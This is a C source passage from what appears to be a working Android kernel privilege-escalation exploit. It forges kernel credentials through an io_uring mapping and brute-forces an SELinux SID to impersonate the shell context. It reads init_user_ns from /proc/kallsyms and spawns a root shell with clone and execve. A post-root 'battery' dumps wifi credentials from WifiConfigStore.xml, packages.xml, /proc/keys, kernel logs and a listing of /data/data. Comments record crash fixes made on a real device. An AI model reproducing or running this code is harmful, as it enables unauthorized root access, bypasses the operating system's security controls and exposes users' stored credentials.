          for (int _j = 0; _j < _l; _j++) relay->data[relay->len++] = _s[_j]; \
        } \
      } while(0)
      #define RELAY_DEC(v) do { \
        long _v = (long)(v); \
        if (_v < 0) { RELAY_PUTC('-'); _v = -_v; } \
        if (_v == 0) { RELAY_PUTC('0'); } \
        else { char _t[24]; int _i = 0; \
          while (_v) { _t[_i++] = '0' + (int)(_v % 10); _v /= 10; } \
          while (_i) RELAY_PUTC(_t[--_i]); \
        } \
      } while(0)
      #define RELAY_HEX(v) do { \
        static const char _h[] = "0123456789abcdef"; \
        RELAY_STR("0x"); \
        for (int _i = 0; _i < 16; _i++) \
          RELAY_PUTC(_h[((unsigned long long)(v) >> ((15 - _i) * 4)) & 0xf]); \
      } while(0)

      RELAY_STR("=== ROOT: uid=0 hits="); RELAY_DEC(hits);
      RELAY_STR("/"); RELAY_DEC(plans); RELAY_STR(" ===\n");
      int shell_spawned = 0;

      /* Crash-free SID resolution (replaces the 32K openat brute force
       * that panicked the device). fake_cred->security points at
       * FAKE_SEC_BLOB on the spray page; blob->sid (+4) is re-read by
       * the kernel on every SELinux hook, so current_sid() is steerable
       * through the uring mapping and verifiable with ONE readback of
       * /proc/self/attr/current (self-attr read takes no avc check).
       * Resolution order:
       *   1. selinux globally off (mode 7 walk 0 landed) -> no SID needed
       *   2. leaked real shell blob (g_leaked_security_ptr) -> verify once
       *   3. live candidates, each verified by a context readback:
       *      cached SID (child-loaded from .gl_sid_cache) > GHOST_SID
       *      env > compiled default 1374 (device-proven)
       *   4. bounded faccessat scan 2..GHOST_SID_MAX: ONE syscall per
       *      trial (no fd churn, no proc inodes), paced, verified hits.
       * Crash guard: if the blob readback does not track our writes
       * (page not the live security blob), the scan is skipped entirely
       * instead of storming syscalls at a dead blob. */
      {
        int found_sid = 0; /* >0: blob locked to this SID;
                            * -1: proceed without blob SID (selinux off /
                            *     leaked real blob verified) */
        const char *sid_how = "none";
        int hb = g_hit_block >= 0 ? g_hit_block : 0;
        uint8_t *hit_page = uring_block(hb);
        char child_ctx[128] = {0};
        char child_fp[160] = {0};
        uint32_t cached_sid = 0;
        if (relay != MAP_FAILED) {
          __atomic_thread_fence(__ATOMIC_SEQ_CST);
          cached_sid = relay->child_sid_cached;
          for (int i = 0; i < (int)sizeof(child_ctx)-1 && relay->child_ctx[i]; i++)
            child_ctx[i] = relay->child_ctx[i];
          for (int i = 0; i < (int)sizeof(child_fp)-1 && relay->child_fp[i]; i++)
            child_fp[i] = relay->child_fp[i];
        }
        RELAY_STR("sid: hit_block="); RELAY_DEC(hb);
        RELAY_STR(" uring_count="); RELAY_DEC(uring_count);
        RELAY_STR(" hit_page="); RELAY_HEX((uintptr_t)hit_page);
        RELAY_STR(" child_ctx="); RELAY_STR(child_ctx);
        RELAY_STR(" cached="); RELAY_DEC(cached_sid);
        RELAY_STR(" leaked_sec="); RELAY_HEX(g_leaked_security_ptr);
        RELAY_STR("\n");
        if (!hit_page) {
          RELAY_STR("sid: hit_page NULL - trying block 0\n");
          hit_page = uring_block(0);
        }

        if (g_selinux_off) {
          /* selinux_state zeroed (mode 7 walk 0): avc_denied() never
           * denies, so the SID value no longer matters for access. */
          RELAY_STR("sid: selinux OFF - no SID resolution needed\n");
          sid_how = "selinux-off";
          if (hit_page && cached_sid) blob_set_sid(hit_page, cached_sid);
          found_sid = -1;
        } else if (g_leaked_security_ptr) {
          /* fake_cred->security == the REAL shell blob: current_sid()
           * is the shell SID already. One readback to confirm (also
           * proves the swapped cred survives a SELinux hook). */
          char cb[128];
          long cn = sid_read_ctx(cb, sizeof(cb));
          if (cn > 0 && sid_ctx_is_shell(cb, cn, child_ctx)) {
            RELAY_STR("sid: leaked blob verified ctx=");
            RELAY_STR(cb); RELAY_STR("\n");
            sid_how = "leaked-blob";
            found_sid = -1;
          } else {
            RELAY_STR("sid: leaked blob readback MISMATCH (cn=");
            RELAY_DEC(cn);
            if (cn > 0) { RELAY_STR(" ctx="); RELAY_STR(cb); }
            RELAY_STR(") - leaked ptr is garbage; re-pointing "
                      "cred->security at the page blob\n");
            /* Recovery: the kernel re-reads cred->security on every
             * SELinux hook, so one aligned 8-byte store through the
             * uring mapping flips the process onto OUR blob (kernel
             * address page_base + FAKE_SEC_BLOB_OFF); the normal SID
             * resolution below then takes over. */
            if (page_base && hit_page) {
              *(volatile uint64_t *)(hit_page + FAKE_CRED_OFF +
                                     CRED15_SECURITY_OFF) =
                  (uint64_t)(page_base + SKB_DATA_DELTA + FAKE_SEC_BLOB_OFF);
              __atomic_thread_fence(__ATOMIC_SEQ_CST);
              g_leaked_security_ptr = 0;
              RELAY_STR("sid: cred->security -> ");
              RELAY_HEX(page_base + SKB_DATA_DELTA + FAKE_SEC_BLOB_OFF);
              RELAY_STR("\n");
            }
          }
        }

        if (!found_sid && !g_selinux_off && !g_leaked_security_ptr &&
            hit_page) {
          char cb[128];
          /* Liveness probe: fill_fake_cred_suite initialized blob->sid=1
           * (kernel), so a live blob reads back u:r:kernel:s0 with no
           * writes from us. A mismatch means our page is not the blob
           * the kernel sees -> any scan would be a pointless storm. */
          long cn = sid_read_ctx(cb, sizeof(cb));
          int blob_live = (cn > 0 && sid_contains(cb, cn, "kernel"));
          RELAY_STR("sid: blob liveness cn="); RELAY_DEC(cn);
          if (cn > 0) { RELAY_STR(" ctx="); RELAY_STR(cb); }
          RELAY_STR(blob_live ? " -> LIVE\n"
                              : " -> NOT LIVE: scan skipped (crash guard)\n");

          /* Page r/w sanity (diagnostic) */
          volatile uint32_t *sec_sid =
              (volatile uint32_t *)(hit_page + FAKE_SEC_BLOB_OFF + 4);
          uint32_t before = *sec_sid;
          *sec_sid = 0xDEAD;
          __atomic_thread_fence(__ATOMIC_SEQ_CST);
          uint32_t after = *sec_sid;
          *sec_sid = before;
          RELAY_STR("sec_blob r/w test: before="); RELAY_DEC(before);
          RELAY_STR(" after_write="); RELAY_DEC(after);
          RELAY_STR(after == 0xDEAD ? " OK\n" : " FAIL (page not ours!)\n");

          if (blob_live) {
            /* Candidate-first verification: each costs one blob write +
             * one 3-syscall context readback. SIDs are stable across
             * boots for a given policy, so the cached/default candidates
             * almost always hit -- the scan below is only a fallback. */
            uint32_t cands[3];
            int ncand = 0;
            if (cached_sid) cands[ncand++] = cached_sid;
            if (sid_env_override > 0) cands[ncand++] = (uint32_t)sid_env_override;
            if (sid_default > 0) cands[ncand++] = (uint32_t)sid_default;
            for (int ci = 0; ci < ncand && !found_sid; ci++) {
              uint32_t c = cands[ci];
              int dup = 0;
              for (int cj = 0; cj < ci; cj++) if (cands[cj] == c) dup = 1;
              if (dup) continue;
              blob_set_sid(hit_page, c);
              long vn = sid_read_ctx(cb, sizeof(cb));
              if (vn > 0 && sid_ctx_is_shell(cb, vn, child_ctx)) {
                found_sid = (int)c;
                sid_how = (cached_sid && c == cached_sid) ? "cache"
                        : (sid_env_override > 0 && c == (uint32_t)sid_env_override)
                          ? "env" : "default";
                RELAY_STR("sid: CANDIDATE "); RELAY_DEC(c);
                RELAY_STR(" VERIFIED ctx="); RELAY_STR(cb); RELAY_STR("\n");
              } else {
                RELAY_STR("sid: candidate "); RELAY_DEC(c);
                RELAY_STR(" rejected (vn="); RELAY_DEC(vn);
                if (vn > 0) { RELAY_STR(" ctx="); RELAY_STR(cb); }
                RELAY_STR(")\n");
              }
            }
            if (!found_sid) {
              /* Re-probe liveness before scanning: writing sid=1 must
               * still read back kernel, else the blob wedged mid-run. */
              blob_set_sid(hit_page, 1);
              long ln = sid_read_ctx(cb, sizeof(cb));
              int still_live = (ln > 0 && sid_contains(cb, ln, "kernel"));
              if (!still_live) {
                RELAY_STR("sid: blob died after candidates - "
                          "scan skipped\n");
              } else if (!sid_scan_enable) {
                RELAY_STR("sid: scan disabled (GHOST_SID_SCAN=0)\n");
              } else {
                /* Bounded fallback scan over the child-created probe
                 * file. faccessat = ONE syscall per trial, no fd churn,
                 * no file creation, no proc inodes: invalid SID ->
                 * EACCES at the first path-walk check; the shell SID ->
                 * success. Successful trials are verified with the
                 * context readback (rejects e.g. adbd's SID). Paced
                 * every 128 trials so AVC/RCU reclaim keeps up -- the
                 * old storm did 32K x (open+read+close) and panicked
                 * the 2GB device. */
                RELAY_STR("sid: fallback scan 2.."); RELAY_DEC(sid_scan_max);
                RELAY_STR("\n");
                for (int s = 2; s <= sid_scan_max && !found_sid; s++) {
                  blob_set_sid(hit_page, (uint32_t)s);
                  long r = syscall(__NR_faccessat, AT_FDCWD,
                                   GL_SID_PROBE_PATH, R_OK, 0);
                  if (r == 0) {
                    long vn = sid_read_ctx(cb, sizeof(cb));
                    if (vn <= 0) /* one retry */
                      vn = sid_read_ctx(cb, sizeof(cb));
                    if (vn > 0) {
                      if (sid_ctx_is_shell(cb, vn, child_ctx)) {
                        found_sid = s;
                        sid_how = "scan";
                        RELAY_STR("FOUND shell at SID="); RELAY_DEC(s);
                        RELAY_STR(" ctx="); RELAY_STR(cb); RELAY_STR("\n");
                      } else {
                        RELAY_STR("  sid="); RELAY_DEC(s);
                        RELAY_STR(" access OK but ctx="); RELAY_STR(cb);
                        RELAY_STR(" (not shell)\n");
                      }
                    } else {
                      /* Context readback broken but the access probe
                       * passed: accept unverified (cannot do better). */
                      found_sid = s;
                      sid_how = "scan-unverified";
                      RELAY_STR("sid: scan hit "); RELAY_DEC(s);
                      RELAY_STR(" (ctx readback broken - unverified)\n");
                    }
                  }
                  if ((s & 0x7F) == 0) {
                    sid_nanosleep_usec(300);
                    if ((s & 0x3FF) == 0) {
                      RELAY_STR("  tried "); RELAY_DEC(s);
                      RELAY_STR("...\n");
                    }
                  }
                }
                if (!found_sid) {
                  RELAY_STR("sid_scan: FAILED (2-"); RELAY_DEC(sid_scan_max);
                  RELAY_STR(")\n");
                  blob_set_sid(hit_page, 1); /* restore sane kernel SID */
                }
              }
            }
          }
        }

        if (found_sid > 0 && hit_page) {
          RELAY_STR("sid_found="); RELAY_DEC(found_sid);
          RELAY_STR(" (0x");
          for (int _i = 0; _i < 8; _i++)
            RELAY_PUTC("0123456789abcdef"[(found_sid >> (28 - _i * 4)) & 0xf]);
          RELAY_STR(") how="); RELAY_STR(sid_how); RELAY_STR("\n");
          /* Lock in the working SID */
          blob_set_sid(hit_page, (uint32_t)found_sid);
          /* Cache for the next run: the relay child persists this line
           * to GL_SID_CACHE_PATH when it dumps the payload. */
          RELAY_STR(GL_SID_CACHE_TAG);
          RELAY_STR("FP="); RELAY_STR(child_fp);
          RELAY_STR(" SID="); RELAY_DEC(found_sid);
          RELAY_STR(" CTX="); RELAY_STR(child_ctx);
          RELAY_STR("\n");
        }
        /* user_ns live-tune (SAFE): cap_capable() walks the ns ancestor
         * chain (ns = targ_ns; ns != cred->user_ns; ns = ns->parent) and
         * returns -EPERM when ns->level <= cred->user_ns->level. If
         * cred->user_ns is NOT an ancestor of &init_user_ns and its
         * ->level happens to be negative, the walk steps off the top
         * (init_user_ns->parent == NULL) and NULL-derefs -> KERNEL PANIC
         * (observed: pc=cap_capable+0x10 reading [NULL+0xe0]). Probing
         * candidate addresses with openat is therefore lethal for any
         * wrong candidate. Instead read the EXACT &init_user_ns from
         * /proc/kallsyms (deterministic; root-owned 0400 so the open
         * passes via the owner match, never through capable()) and
         * install it; if kallsyms is unreadable, keep the table value
         * (off_init_user_ns_device, now the observed 0x19EB898) without
         * probing. The battery's file_create test validates DAC. */
        if (hit_page && found_sid && env_flag("GHOST_NS_TUNE", 1)) {
          volatile uint64_t *cred_ns =
              (volatile uint64_t *)(hit_page + FAKE_CRED_OFF +
                                    CRED15_USER_NS_OFF);
          uint64_t cur_ns = *cred_ns;
          uint64_t kns = 0;
          int kf = (int)syscall(__NR_openat, AT_FDCWD, "/proc/kallsyms",
                                O_RDONLY, 0);
          if (kf >= 0) {
            char kb[4096];
            char line[512];
            int llen = 0;
            long kn;
            static const char symtail[] = " init_user_ns";
            const int symlen = (int)(sizeof(symtail) - 1);
            while (!kns &&
                   (kn = syscall(__NR_read, kf, kb, sizeof(kb))) > 0) {
              for (long i = 0; i < kn && !kns; i++) {
                char ch = kb[i];
                if (ch == '\n') {
                  line[llen] = 0;
                  if (llen >= symlen) {
                    int match = 1;
                    for (int j = 0; j < symlen; j++)
                      if (line[llen - symlen + j] != symtail[j]) {
                        match = 0; break;
                      }
                    if (match) {
                      uint64_t a = 0;
                      for (int j = 0; j < llen; j++) {
                        char c = line[j];
                        int d = (c >= '0' && c <= '9') ? (c - '0')
                              : (c >= 'a' && c <= 'f') ? (c - 'a' + 10)
                              : (c >= 'A' && c <= 'F') ? (c - 'A' + 10) : -1;
                        if (d < 0) break;
                        a = (a << 4) | (uint64_t)(unsigned)d;
                      }
                      if (a) kns = a;
                    }
                  }
                  llen = 0;
                } else if (llen < (int)sizeof(line) - 1) {
                  line[llen++] = ch;
                }
              }
            }
            syscall(__NR_close, kf);
          }
          if (kns && kns != cur_ns) {
            *cred_ns = kns;
            __atomic_thread_fence(__ATOMIC_SEQ_CST);
            RELAY_STR("ns_tune: kallsyms init_user_ns=");
            RELAY_HEX(kns);
            RELAY_STR(" installed (was ");
            RELAY_HEX(cur_ns);
            RELAY_STR(")\n");
          } else if (kns) {
            RELAY_STR("ns_tune: user_ns == kallsyms init_user_ns=");
            RELAY_HEX(kns);
            RELAY_STR(" (already correct)\n");
          } else {
            RELAY_STR("ns_tune: kallsyms unreadable; keeping user_ns=");
            RELAY_HEX(cur_ns);
            RELAY_STR(" (no probe)\n");
          }
        }
        /* ==== POST-ROOT DAC/SELINUX BISECTION PROBES (opt-in) ====
         * Diagnostic probes (GHOST_PROBE=1) to classify file-access
         * failures: pb1 O_CREAT, pb3 append existing, pb4 faccessat
         * W_OK on dir, pb6 mkdirat. Enabled this to pin down the
         * enforcing-mode EACCES: dir W passes (group DAC ok) while
         * create is denied -> SELinux create/labeling wall, solved by
         * running mode 7 (GHOST_SELINUX=1, selinux zeroed). */
        if (ghost_probe) {
          int pb1 = (int)syscall(__NR_openat, AT_FDCWD, ".gl_pb1", O_CREAT | O_TRUNC | O_WRONLY, 0644);
          int e1 = errno;
          int pb3 = (int)syscall(__NR_openat, AT_FDCWD, "gl2_relay.txt", O_WRONLY | O_APPEND, 0);
          int e3 = errno;
          int pb4 = (int)syscall(__NR_faccessat, AT_FDCWD, ".", W_OK, 0);
          int e4 = errno;
          int pb6 = (int)syscall(__NR_mkdirat, AT_FDCWD, ".gl_pbdir", 0755);
          int e6 = errno;
          RELAY_STR("probe: pb1_creat="); RELAY_DEC(pb1); RELAY_STR(" e="); RELAY_DEC(e1);
          RELAY_STR(" pb3_append="); RELAY_DEC(pb3); RELAY_STR(" e="); RELAY_DEC(e3);
          RELAY_STR(" pb4_dirW="); RELAY_DEC(pb4); RELAY_STR(" e="); RELAY_DEC(e4);
          RELAY_STR(" pb6_mkdir="); RELAY_DEC(pb6); RELAY_STR(" e="); RELAY_DEC(e6);
          RELAY_STR("\n");
          if (pb1 >= 0) {
            if ((int)syscall(__NR_write, pb1, "PB1OK\n", 6) < 0) {
              RELAY_STR("probe: pb1 write e="); RELAY_DEC(errno); RELAY_STR("\n");
            }
            syscall(__NR_close, pb1);
            syscall(__NR_unlinkat, AT_FDCWD, ".gl_pb1", 0);
          }
          if (pb3 >= 0) syscall(__NR_close, pb3);
          if (pb6 >= 0) syscall(__NR_unlinkat, AT_FDCWD, ".gl_pbdir", AT_REMOVEDIR);
        }
        if (found_sid) {
          /* Root shell: fork a child (raw clone -- libc fork touches
           * pthread locks, wedged post-walk) and exec from THERE. The
           * parent must NOT execve itself: exec's de_thread() SIGKILLs
           * the owner/consumer threads while the exploit state is still
           * live -- observed as a kernel panic right after
           * "=== ROOT SHELL ===" (no battery artifacts ever persisted).
           * The child is single-threaded (its de_thread is a no-op) and
           * inherits the root+shell creds via get_cred on the fake cred.
           * The parent continues to the battery; the child keeps the
           * adb pty as an interactive root shell (it survives the
           * parent's exit_group as an orphan; the io_uring fds backing
           * the fake cred page stay open in the child). */
          RELAY_STR("=== ROOT SHELL: clone+exec /system/bin/sh ===\n");
          __atomic_thread_fence(__ATOMIC_SEQ_CST);
          if (relay != MAP_FAILED) relay->ready = 1;
          /* Clean up any stale test files that might block us */
          syscall(__NR_unlinkat, AT_FDCWD, "/data/local/tmp/.gl_sid_test", 0);
          syscall(__NR_unlinkat, AT_FDCWD, "/data/local/tmp/gl2_test_create.txt", 0);
          if (ghost_exec) {
            long cpid = syscall(__NR_clone, (unsigned long)SIGCHLD, 0, 0, 0, 0);
            if (cpid == 0) {
              /* ==== ROOT SHELL CHILD: root creds, single-threaded ==== */
              /* Crash triage marker: written pre-exec (root+shell SID+
               * groups should pass; if the device dies DURING the exec,
               * the marker is already fsynced). */
              int mk = (int)syscall(__NR_openat, AT_FDCWD,
                                    "/data/local/tmp/.gl_shell_pre_exec",
                                    O_WRONLY|O_CREAT|O_TRUNC, 0644);
              if (mk >= 0) {
                syscall(__NR_write, mk, "1\n", 2);
                syscall(__NR_fsync, mk);
                syscall(__NR_close, mk);
              }
              static const char *sh_path = "/system/bin/sh";
              const char *sh_argv[] = { "sh", NULL };
              const char *sh_envp[] = {
                "PATH=/sbin:/system/sbin:/system/bin:/system/xbin:/vendor/bin",
                "HOME=/data/local/tmp",
                "TERM=xterm-256color",
                NULL,
              };
              syscall(__NR_execve, sh_path, (char *const *)sh_argv,
                      (char *const *)sh_envp);
              /* execve failed - report and die */
              static const char em[] = "[!] root shell: execve failed\n";
              syscall(__NR_write, 1, em, sizeof(em) - 1);
              syscall(__NR_exit, 127);
            }
            RELAY_STR("root shell child pid="); RELAY_DEC(cpid);
            RELAY_STR(cpid > 0 ? "\n" : " (clone FAILED)\n");
            if (cpid > 0) shell_spawned = 1;
          } else {
            RELAY_STR("root shell: skipped (GHOST_EXEC=0)\n");
          }
        } else {
          RELAY_STR("sid: NOT RESOLVED - battery continues (relay I/O "
                    "still works via child)\n");
        }
      }
      #define PROBE(fd, label, path) do { \
          RAW_WRITE(fd, label); \
          int _pf = (int)syscall(__NR_openat, AT_FDCWD, path, O_RDONLY, 0); \
          if (_pf >= 0) { \
            char _pb[2048]; long _pn; \
            _pn = syscall(__NR_read, _pf, _pb, sizeof(_pb)-1); \
            if (_pn > 0) syscall(__NR_write, fd, _pb, _pn); \
            syscall(__NR_close, _pf); \
          } else { \
            RAW_WRITE(fd, "DENIED"); RAW_WERRNO(fd); \
          } \
          RAW_WRITE(fd, "\n"); \
        } while(0)
      /* Append battery diagnostics to the relay (relay->len already has
       * the SID brute-force results from above). The relay child writes
       * this to disk + stdout. */
      if (relay != MAP_FAILED) {
        RELAY_STR("--- battery ---\n");
        /* Try to read our SELinux context */
        int af = (int)syscall(__NR_openat, AT_FDCWD,
                              "/proc/self/attr/current", O_RDONLY, 0);
        if (af >= 0) {
          char ab[256]; long an = syscall(__NR_read, af, ab, sizeof(ab)-1);
          syscall(__NR_close, af);
          if (an > 0) { RELAY_STR("selinux="); for (long _j=0;_j<an;_j++) RELAY_PUTC(ab[_j]); RELAY_STR("\n"); }
          else RELAY_STR("selinux=EMPTY\n");
        } else {
          RELAY_STR("selinux=OPEN_DENIED\n");
        }
        /* Test: can we write to stdout? */
        long wr = syscall(__NR_write, 1, "[MAIN] alive\n", 13);
        RELAY_STR("stdout_write_ret="); RELAY_DEC(wr); RELAY_STR("\n");
        /* Test: can we create a new file? */
        int tf = (int)syscall(__NR_openat, AT_FDCWD,
                              "/data/local/tmp/gl2_test_create.txt",
                              O_WRONLY|O_CREAT|O_TRUNC, 0644);
        if (tf >= 0) {
          RELAY_STR("file_create=OK\n");
          syscall(__NR_write, tf, "test\n", 5);
          syscall(__NR_close, tf);
        } else {
          RELAY_STR("file_create=DENIED errno="); RELAY_DEC(errno); RELAY_STR("\n");
        }
        RELAY_STR("uid="); RELAY_DEC(uid_now);
        RELAY_STR(" hits="); RELAY_DEC(hits);
        RELAY_STR("/"); RELAY_DEC(plans); RELAY_STR("\n");

        /* kallsyms scan (only if we have a working SID or via relay) */
        RELAY_STR("kallsyms: trying open...\n");
        int kf = (int)syscall(__NR_openat, AT_FDCWD,
                              "/proc/kallsyms", O_RDONLY, 0);
        if (kf >= 0) {
          RELAY_STR("kallsyms: OPEN OK, scanning...\n");
          char kb[4096]; long kn; int found = 0;
          while (!found && (kn = syscall(__NR_read, kf, kb, sizeof(kb))) > 0) {
            for (long i = 0; i < kn - 16; i++) {
              if (kb[i]==' ' && kb[i+2]==' ' &&
                  kb[i+3]=='s' && kb[i+4]=='e' && kb[i+5]=='l' &&
                  kb[i+6]=='i' && kb[i+7]=='n' && kb[i+8]=='u' &&
                  kb[i+9]=='x' && kb[i+10]=='_' && kb[i+11]=='s' &&
                  kb[i+12]=='t' && kb[i+13]=='a' && kb[i+14]=='t' &&
                  kb[i+15]=='e') {
                int ls = (int)i - 1;
                while (ls > 0 && kb[ls-1] != '\n') ls--;
                int le = (int)i + 16;
                while (le < (int)kn && kb[le] != '\n') le++;
                RELAY_STR("FOUND: ");
                for (int _j = ls; _j < le; _j++) RELAY_PUTC(kb[_j]);
                RELAY_STR("\n");
                found = 1; break;
              }
            }
          }
          if (!found) RELAY_STR("selinux_state: NOT FOUND (scanned to EOF)\n");
          syscall(__NR_close, kf);
        } else {
          RELAY_STR("kallsyms: OPEN DENIED errno="); RELAY_DEC(errno); RELAY_STR("\n");
        }
        RELAY_STR("=== relay done ===\n");
        __atomic_thread_fence(__ATOMIC_SEQ_CST);
        relay->ready = 1;
      }
      {
        /* Marker -- use .ghostlock_root2 to avoid root-owned old file */
        int mf = (int)syscall(__NR_openat, AT_FDCWD,
                              "/data/local/tmp/.ghostlock_root2",
                              O_WRONLY|O_CREAT|O_TRUNC, 0644);
        if (mf >= 0) {
          RAW_WRITE(mf, "root=1 uid=0 hits=");
          raw_wdec(mf, hits); RAW_WRITE(mf, "/"); raw_wdec(mf, plans);
          RAW_WRITE(mf, " selinux=");
          raw_wstr(mf, g_selinux_off ? "permissive\n" : "enforcing?\n");
          syscall(__NR_fsync, mf);
          syscall(__NR_close, mf);
        }
        /* The root test battery. If the battery file cannot even be
         * created (SELinux still enforcing - mode-6 fallback), probe
         * into stdout instead so the results are never lost. */
        int of = (int)syscall(__NR_openat, AT_FDCWD,
                              "/data/local/tmp/.ghostlock_out",
                              O_WRONLY|O_CREAT|O_TRUNC, 0644);
        int to_stdout = 0;
        if (of < 0) {
          to_stdout = 1;
          of = 1;
          RAW_WRITE(1, "[!] battery file open failed");
          RAW_WERRNO(1);
          RAW_WRITE(1, " - probing to stdout instead\n");
        }
        if (of >= 0) {
          /* diagnostics header: raw uid/gid + the write-plan outcome */
          RAW_WRITE(of, "=== ghostlock root battery ===\nuid=");
          raw_wdec(of, (long)uid_now);
          RAW_WRITE(of, " gid="); raw_wdec(of, (long)syscall(__NR_getgid));
          RAW_WRITE(of, " euid="); raw_wdec(of, (long)syscall(__NR_geteuid));
          RAW_WRITE(of, " (was uid="); raw_wdec(of, (long)uid_before);
          RAW_WRITE(of, ") erase hits="); raw_wdec(of, hits);
          RAW_WRITE(of, "/"); raw_wdec(of, plans);
          RAW_WRITE(of, " kaslr_base="); raw_whex(of, kaslr_base);
          if (g_selinux_write_armed) {
            RAW_WRITE(of, " selinux_state="); raw_whex(of, g_selinux_target);
            RAW_WRITE(of, " selinux=");
            raw_wstr(of, g_selinux_off ? "OFF" : "STILL ENFORCING");
          }
          RAW_WRITE(of, "\n");
          PROBE(of, "=== uid (proof) ===\n", "/proc/self/status");
          PROBE(of, "=== selinux context ===\n", "/proc/self/attr/current");
          PROBE(of, "=== selinux enforce (want 0) ===\n",
                "/sys/fs/selinux/enforce");
          PROBE(of, "=== init cmdline ===\n", "/proc/1/cmdline");
          PROBE(of, "=== init status ===\n", "/proc/1/status");
          /* /dev/kmsg must be opened O_NONBLOCK: a blocking read stalls
           * when the log ring has no pending records. */
          RAW_WRITE(of, "=== kmsg read ===\n");
          {
            int kf = (int)syscall(__NR_openat, AT_FDCWD, "/dev/kmsg",
                                  O_RDONLY|O_NONBLOCK, 0);
            if (kf >= 0) {
              char kb[2048];
              long kn = syscall(__NR_read, kf, kb, sizeof(kb)-1);
              if (kn > 0) syscall(__NR_write, of, kb, kn);
              syscall(__NR_close, kf);
            } else {
              RAW_WRITE(of, "DENIED"); RAW_WERRNO(of);
            }
            RAW_WRITE(of, "\n");
          }
          /* root-only WRITE test: /dev/kmsg accepts writes with
           * CAP_SYSLOG; a real root-only channel unlike /data/local/tmp. */
          RAW_WRITE(of, "=== kmsg write (root-only) ===\n");
          {
            int kf = (int)syscall(__NR_openat, AT_FDCWD, "/dev/kmsg",
                                  O_WRONLY, 0);
            if (kf >= 0) {
              RAW_WRITE(kf, "<6>GhostLock: root battery write test uid=0");
              syscall(__NR_close, kf);
              RAW_WRITE(of, "WRITE OK\n");
            } else {
              RAW_WRITE(of, "DENIED"); RAW_WERRNO(of); RAW_WRITE(of, "\n");
            }
          }
          PROBE(of, "=== wifi creds ===\n",
                "/data/misc/wifi/WifiConfigStore.xml");
          PROBE(of, "=== packages ===\n", "/data/system/packages.xml");
          /* Full kallsyms scan for selinux_state -- raw syscalls only.
           * Format: "ffffffc0093796d0 b selinux_state\n" */
          RAW_WRITE(of, "=== kallsyms scan ===\n");
          {
            int kf = (int)syscall(__NR_openat, AT_FDCWD,
                                  "/proc/kallsyms", O_RDONLY, 0);
            if (kf >= 0) {
              char kb[4096];
              char prev[256]; int prev_len = 0;
              long kn; int found = 0;
              while (!found && (kn = syscall(__NR_read, kf, kb, sizeof(kb))) > 0) {
                /* prepend leftover from previous chunk */
                if (prev_len > 0 && kn > 0) {
                  int copy = (int)(sizeof(prev) - 1 - prev_len);
                  if (copy > kn) copy = (int)kn;
                  for (int j = 0; j < copy; j++) prev[prev_len+j] = kb[j];
                  prev_len += copy;
                  prev[prev_len] = 0;
                  /* scan prev for target */
                  for (int j = 0; j < prev_len - 14; j++) {
                    if (prev[j]==' ' && prev[j+2]==' ' &&
                        prev[j+3]=='s' && prev[j+4]=='e' && prev[j+5]=='l' &&
                        prev[j+6]=='i' && prev[j+7]=='n' && prev[j+8]=='u' &&
                        prev[j+9]=='x' && prev[j+10]=='_' && prev[j+11]=='s' &&
                        prev[j+12]=='t' && prev[j+13]=='a' && prev[j+14]=='t' &&
                        prev[j+15]=='e' && (prev[j+16]=='\n' || prev[j+16]==0)) {
                      /* find start of this line (address) */
                      int ls = j - 1;
                      while (ls > 0 && prev[ls-1] != '\n') ls--;
                      RAW_WRITE(of, "FOUND: ");
                      syscall(__NR_write, of, prev + ls, j + 16 - ls);
                      RAW_WRITE(of, "\n");
                      found = 1; break;
                    }
                  }
                  prev_len = 0;
                }
                if (found) break;
                /* scan current chunk */
                for (long i = 0; i < kn - 14; i++) {
                  if (kb[i]==' ' && kb[i+2]==' ' &&
                      kb[i+3]=='s' && kb[i+4]=='e' && kb[i+5]=='l' &&
                      kb[i+6]=='i' && kb[i+7]=='n' && kb[i+8]=='u' &&
                      kb[i+9]=='x' && kb[i+10]=='_' && kb[i+11]=='s' &&
                      kb[i+12]=='t' && kb[i+13]=='a' && kb[i+14]=='t' &&
                      kb[i+15]=='e' && (kb[i+16]=='\n' || i+16>=kn)) {
                    int ls = (int)i - 1;
                    while (ls > 0 && kb[ls-1] != '\n') ls--;
                    RAW_WRITE(of, "FOUND: ");
                    int le = (int)i + 16;
                    if (le > (int)kn) le = (int)kn;
                    syscall(__NR_write, of, kb + ls, le - ls);
                    RAW_WRITE(of, "\n");
                    found = 1; break;
                  }
                }
                if (!found) {
                  /* save tail for cross-boundary match */
                  int tail = 256;
                  if (tail > (int)kn) tail = (int)kn;
                  for (int j = 0; j < tail; j++)
                    prev[j] = kb[(int)kn - tail + j];
                  prev_len = tail;
                }
              }
              if (!found) RAW_WRITE(of, "NOT FOUND (scanned to EOF)\n");
              syscall(__NR_close, kf);
            } else {
              RAW_WRITE(of, "DENIED"); RAW_WERRNO(of); RAW_WRITE(of, "\n");
            }
          }
          PROBE(of, "=== partitions ===\n", "/proc/partitions");
          PROBE(of, "=== mounts ===\n", "/proc/mounts");
          PROBE(of, "=== keys ===\n", "/proc/keys");
          /* /data/data dir listing via getdents64 */
          RAW_WRITE(of, "=== /data/data ===\n");
          {
            int dd = (int)syscall(__NR_openat, AT_FDCWD, "/data/data",
                                  O_RDONLY|O_DIRECTORY, 0);
            if (dd >= 0) {
              char db[2048]; long dr;
              while ((dr = syscall(__NR_getdents64, dd, db, sizeof(db))) > 0) {
                long dp = 0;
                while (dp < dr) {
                  unsigned short rl = *(unsigned short *)(db + dp + 16);
                  char *nm = db + dp + 19;
                  long nl = 0; while (nm[nl] && nl < 200) nl++;
                  syscall(__NR_write, of, nm, nl);
                  RAW_WRITE(of, "\n");
                  dp += rl;
                }
              }
              syscall(__NR_close, dd);
            } else {
              RAW_WRITE(of, "DENIED"); RAW_WERRNO(of); RAW_WRITE(of, "\n");
            }
          }
          RAW_WRITE(of, "=== DONE ===\n");
          if (!to_stdout) {
            syscall(__NR_fsync, of);
            syscall(__NR_close, of);
          }
        }
      }
      #undef PROBE
      /* Root shell. execve is safe ONLY when every planned erase landed
       * AND the capture was a full 16KB mapping (uring/spectrum/skb):
       * plans fire strictly in prefix order, so hits == plan_count
       * implies cred == real_cred == fake_cred. commit_creds() at exec
       * BUG_ONs if task->cred != task->real_cred, and with SELinux off
       * (mode 7 walk 0) the exec itself is no longer EACCES-denied.
       * A MOVABLE-storm capture (g_hit_block >= g_storm_block_start)
       * presents only base page 0 of the mm page - the fake cred's
       * page-1 fields (ucounts terminator) are foreign pages there, so
       * the commit_creds path would walk garbage: NO exec on storm
       * captures (root + battery only). de_thread() reaps the
